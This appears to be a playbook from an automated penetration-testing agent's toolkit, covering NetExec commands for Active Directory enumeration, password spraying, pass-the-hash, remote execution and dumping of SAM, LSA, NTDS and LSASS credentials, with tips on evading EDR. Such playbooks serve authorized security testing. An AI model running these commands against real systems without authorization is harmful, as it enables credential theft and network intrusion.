# NetExec (NXC) — Multi-Protocol Enumeration & Exploitation

tags: netexec, nxc, crackmapexec, cme, smb, ldap, winrm, mssql, rdp, ssh, wmi, spray, enum, relay, credential, module, spider, lsassy, nanodump, shares, rid, pass-the-hash, pth

## Objective
Use NetExec as a Swiss-army knife for network enumeration, credential testing, and post-exploitation across SMB, LDAP, WinRM, MSSQL, RDP, and SSH protocols.

## Prerequisites
- NetExec installed (`pipx install netexec` or `apt install netexec`)
- Network access to target hosts
- For authenticated operations: valid credential (password, NTLM hash, or Kerberos ticket)

## Methodology

### SMB Enumeration (OPSEC: 0.3)
```bash
# Enumerate hosts — signing, OS, domain info
nxc smb <target_range> --gen-relay-list relay-targets.txt

# Null session check
nxc smb <target> -u '' -p ''

# Guest session check
nxc smb <target> -u 'guest' -p ''

# List shares (authenticated)
nxc smb <target> -u <user> -p <pass> --shares

# RID brute-force (user enumeration via null/guest)
nxc smb <target> -u 'guest' -p '' --rid-brute 4000

# Spider shares for sensitive files
nxc smb <target> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=false
```

### LDAP Enumeration (OPSEC: 0.3)
```bash
# Domain users
nxc ldap <dc_ip> -u <user> -p <pass> --users

# Domain groups
nxc ldap <dc_ip> -u <user> -p <pass> --groups

# Kerberoastable users (SPNs)
nxc ldap <dc_ip> -u <user> -p <pass> --kerberoasting kerberoast.txt

# AS-REP roastable users
nxc ldap <dc_ip> -u <user> -p <pass> --asreproast asrep.txt

# Password policy
nxc ldap <dc_ip> -u <user> -p <pass> --password-policy

# LAPS passwords
nxc ldap <dc_ip> -u <user> -p <pass> -M laps

# GMSA passwords
nxc ldap <dc_ip> -u <user> -p <pass> -M gmsa

# Machine account quota (MAQ)
nxc ldap <dc_ip> -u <user> -p <pass> -M maq

# Trusted-for-delegation accounts
nxc ldap <dc_ip> -u <user> -p <pass> --trusted-for-delegation
```

### Credential Testing (OPSEC: 0.5)
```bash
# Password authentication
nxc smb <target> -u <user> -p <pass>

# Pass-the-hash (NTLM)
nxc smb <target> -u <user> -H <ntlm_hash>

# Spray password across user list
nxc smb <dc_ip> -u users.txt -p 'Password1' --no-bruteforce

# Spray hash across user list
nxc smb <dc_ip> -u users.txt -H <hash> --no-bruteforce

# WinRM credential testing
nxc winrm <target> -u <user> -p <pass>

# MSSQL credential testing
nxc mssql <target> -u <user> -p <pass>

# RDP credential testing
nxc rdp <target> -u <user> -p <pass>
```

### Post-Exploitation Modules (OPSEC: 0.5)
```bash
# Dump SAM hashes (requires local admin)
nxc smb <target> -u <user> -p <pass> --sam

# Dump LSA secrets
nxc smb <target> -u <user> -p <pass> --lsa

# Dump NTDS.dit (requires domain admin on DC)
nxc smb <dc_ip> -u <user> -p <pass> --ntds

# Remote LSASS dump via lsassy
nxc smb <target> -u <user> -p <pass> -M lsassy

# Remote LSASS dump via nanodump
nxc smb <target> -u <user> -p <pass> -M nanodump

# DPAPI credential extraction
nxc smb <target> -u <user> -p <pass> -M dpapi

# Execute commands
nxc smb <target> -u <user> -p <pass> -x "whoami /all"

# PowerShell execution
nxc smb <target> -u <user> -p <pass> -X "Get-Process"

# WMI execution
nxc wmi <target> -u <user> -p <pass> -x "whoami"
```

### Multi-Protocol Coverage
```bash
# WinRM command execution
nxc winrm <target> -u <user> -p <pass> -x "whoami"

# MSSQL query execution
nxc mssql <target> -u <user> -p <pass> -q "SELECT @@version"

# MSSQL — enable xp_cmdshell
nxc mssql <target> -u <user> -p <pass> -M mssql_priv

# SSH credential testing
nxc ssh <target> -u <user> -p <pass>
```

## Reporting

### parse_output
Use `parse_output` with `tool_name: "nxc"` or `tool_name: "netexec"` for:
- SMB enumeration output (hosts, services, signing, OS)
- User/group enumeration (creates user, group, domain nodes)
- Share enumeration results
- RID brute-force output

### report_finding
Use `report_finding` manually for:
- Module output (spider_plus, lsassy, nanodump results)
- Command execution output
- LDAP query results that don't fit nxc parser patterns
- Any output the parser doesn't handle (check parse_output first)

### Key Nodes to Report
- **host** — with `ip`, `hostname`, `os`, `domain_name`, `smb_signing`
- **service** — with `port`, `service_name`, `smb_signing`, `smbv1`
- **user** — with `sam_account_name`, `domain_name`, `spn` (if kerberoastable)
- **credential** — with `cred_user`, `cred_type` (`ntlm`/`plaintext`), `cred_domain`
- **Edges**: RUNS (host→service), MEMBER_OF_DOMAIN, OWNS_CRED, ADMIN_TO, HAS_SESSION

## OPSEC Notes
- **SMB enumeration** (0.3): Low noise — standard SMB nego traffic. Signing check is passive.
- **LDAP enumeration** (0.3): Low noise — standard LDAP bind + search. Common admin tool traffic.
- **Credential testing** (0.5): Medium noise — failed logins are logged. Use `--no-bruteforce` for sprays. Respect lockout policy.
- **Post-exploitation** (0.5–0.7): Medium-high noise — SAM/LSA/NTDS dumps trigger security events. LSASS access may trigger EDR. Prefer `nanodump` or `lsassy` over `--sam`/`--lsa` on defended hosts.
- **Command execution** (0.6): Medium noise — creates process on target. WMI is slightly stealthier than SMB exec.
- Always check lockout policy before spraying. Use `--jitter` for timing randomization.
